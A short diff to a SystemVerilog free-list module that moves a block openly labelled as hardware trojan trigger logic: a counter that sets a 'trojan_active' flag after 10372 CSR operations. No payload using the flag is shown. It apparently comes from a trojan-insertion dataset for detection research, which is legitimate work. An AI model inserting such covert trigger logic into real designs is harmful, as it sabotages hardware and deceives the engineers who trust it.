@@ -24,24 +24,6 @@ output
     logic [ ENTRY_WIDTH-1:0 ] headData
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18344;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (pop) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     localparam BIT_WIDTH = $clog2( SIZE );
     typedef logic [BIT_WIDTH-1:0] IndexPath;
 
@@ -60,6 +42,23 @@ output
             .headPtr( headPtr ),
             .tailPtr( tailPtr )
         );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=10372)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 10372;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
         
 
     logic [ ENTRY_WIDTH-1:0 ] freeList[ SIZE-1:0 ];
